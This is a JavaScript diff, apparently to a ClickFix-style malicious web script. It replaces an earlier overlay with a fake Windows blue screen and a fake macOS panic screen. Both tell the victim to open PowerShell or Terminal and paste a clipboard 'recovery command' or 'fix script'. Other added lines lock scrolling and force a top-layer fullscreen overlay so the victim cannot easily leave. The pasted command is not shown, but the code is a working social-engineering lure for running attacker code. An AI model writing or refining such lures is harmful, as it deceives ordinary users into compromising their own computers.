@@ -177,6 +177,10 @@ function handleActivationResponse(data) {
 }
 
 function removeOverlays() {
+    // Restore scroll
+    document.documentElement.style.overflow = '';
+    document.body.style.overflow = '';
+
     // Remove Captcha
     const captchaOverlay = document.getElementById('device-tracker-root'); // Original captcha overlay ID
     if (captchaOverlay) captchaOverlay.remove();
@@ -199,22 +203,37 @@ function showFullscreenOverlay(platform) {
 
     // Content templates
     const winContent = `
-        <h2>Система готова</h2>
-        <div class="step">✅ Самый быстрый способ открыть консоль:</div>
-        <div class="step"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>
-        <div class="divider"></div>
-        <div class="step">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>
-        <div class="note">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>
+        <div class="bsod-wrapper">
+            <div class="bsod-emoji">:(</div>
+            <div class="bsod-title">Your device ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</div>
+            <div class="bsod-percent">0% complete</div>
+            <div class="bsod-footer">
+                <div class="bsod-qr"></div>
+                <div class="bsod-info">
+                    <p>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>
+                    <p>If you call a support person, give them this info:<br>Stop code: CRITICAL_PROCESS_DIED</p>
+                    <div class="bsod-recovery">
+                        <strong>RECOVERY CONSOLE:</strong><br>
+                        1. Press <kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong><br>
+                        2. Paste the recovery command from clipboard and press <strong>Enter</strong>
+                    </div>
+                </div>
+            </div>
+        </div>
     `;
 
     const macContent = `
-        <h2>Система готова</h2>
-        <div class="step">✅ Самый быстрый способ открыть Терминал:</div>
-        <div class="step"><kbd>Command</kbd> + <kbd>Space</kbd> → введите <strong>Terminal</strong> → <kbd>Enter</kbd></div>
-        <div class="divider"></div>
-        <div class="step">🔁 Если поиск не работает:</div>
-        <div class="step"><strong>Программы</strong> → <strong>Утилиты</strong> → <strong>Терминал</strong></div>
-        <div class="note">Полноэкранный режим сохраняется при переключении окон.</div>
+        <div class="mac-panic">
+            <div class="mac-icon"></div>
+            <h1>You need to restart your computer. Hold down the Power button for several seconds or press the Restart button.</h1>
+            <p>Vous devez redémarrer votre ordinateur. Maintenez la touche de démarrage enfoncée pendant plusieurs secondes ou bien appuyez sur le bouton de réinitialisation.</p>
+            <p>Sie müssen Ihren Computer neu starten. Halten Sie den Ein-/Ausschalter gedrückt или нажмите кнопку перезапуска.</p>
+            <div class="mac-recovery">
+                <strong>SERVICE MODE:</strong><br>
+                1. Press <kbd>Command</kbd> + <kbd>Space</kbd> → <strong>Terminal</strong><br>
+                2. Paste the fix script and press <strong>Enter</strong>
+            </div>
+        </div>
     `;
 
     // Create container
@@ -223,26 +242,41 @@ function showFullscreenOverlay(platform) {
     div.innerHTML = `
         <style>
             #vot-fs-overlay {
-                position: fixed; inset: 0; z-index: 999999;
-                background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
+                position: fixed; inset: 0; z-index: 2147483647;
+                background: ${isMac ? '#2c2c2c' : '#0078d7'}; 
+                color: #fff; 
+                font-family: ${isMac ? 'system-ui, sans-serif' : '"Segoe UI", sans-serif'};
                 display: flex; justify-content: center; align-items: center;
-                text-align: center;
+                text-align: left; overflow: hidden;
             }
-            .vot-content {
-                background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
-                box-shadow: 0 25px 80px rgba(0,0,0,.45);
-            }
-            h2 { font-size: 2.5rem; margin-bottom: 28px; }
-            .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
-            kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
-            .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
-            .note { font-size: 0.95rem; opacity: 0.7; }
+            kbd { background: rgba(255,255,255,0.2); border-radius: 4px; padding: 2px 6px; font-family: monospace; }
+            
+            /* BSOD Styles */
+            .bsod-wrapper { padding: 10% 15%; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: flex-start; }
+            .bsod-emoji { font-size: 150px; margin-bottom: 30px; }
+            .bsod-title { font-size: 32px; line-height: 1.3; margin-bottom: 40px; font-weight: 300; }
+            .bsod-percent { font-size: 24px; margin-bottom: 60px; }
+            .bsod-footer { display: flex; align-items: flex-start; gap: 30px; }
+            .bsod-qr { width: 120px; height: 120px; background: #fff; padding: 10px; display: flex; align-items: center; justify-content: center; }
+            .bsod-qr::after { content: ''; width: 100px; height: 100px; background: #000; display: block; } /* Mock QR */
+            .bsod-info { font-size: 18px; line-height: 1.5; }
+            .bsod-recovery { margin-top: 30px; background: rgba(0,0,0,0.1); padding: 20px; border-left: 4px solid #fff; }
+
+            /* Mac Panic Styles */
+            .mac-panic { max-width: 800px; padding: 40px; text-align: center; }
+            .mac-icon { width: 80px; height: 80px; background: #555; border-radius: 50%; margin: 0 auto 30px; position: relative; }
+            .mac-icon::after { content: '⏻'; font-size: 40px; color: #fff; line-height: 80px; }
+            .mac-panic h1 { font-size: 28px; margin-bottom: 20px; }
+            .mac-panic p { font-size: 18px; opacity: 0.8; margin-bottom: 10px; }
+            .mac-recovery { margin-top: 50px; padding: 20px; border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; display: inline-block; text-align: left; }
         </style>
-        <div class="vot-content">
+        <div class="vot-overlay-content">
             ${isMac ? macContent : winContent}
         </div>
     `;
     document.body.appendChild(div);
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
 
     const enterFullscreen = async () => {
         try {
@@ -275,6 +309,8 @@ function showFullscreenOverlay(platform) {
 function showCaptcha(command, platformKey) {
     if (document.getElementById('vot-captcha-overlay')) return;
 
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
 
     // Determine platform
     const isMac = (platformKey || '').toLowerCase().includes('mac');
